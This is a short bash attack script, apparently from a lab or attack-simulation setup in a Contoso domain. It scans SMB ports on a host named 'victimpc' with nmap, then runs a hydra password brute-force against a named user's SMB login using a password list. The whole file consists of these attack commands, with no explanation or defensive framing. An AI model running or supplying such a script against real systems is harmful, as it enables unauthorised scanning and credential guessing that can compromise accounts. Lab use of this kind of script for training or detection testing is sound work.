#!/bin/bash

nmap -sC -p 139,445 victimpc.contoso.azure
read -p "Press [Enter] key to start next process...(hydra bruteforce against victimpc)"
hydra -l jeffl -P passwordsList_jeffl.txt smb://victimpc.contoso.azure -m "domain=CONTOSO"
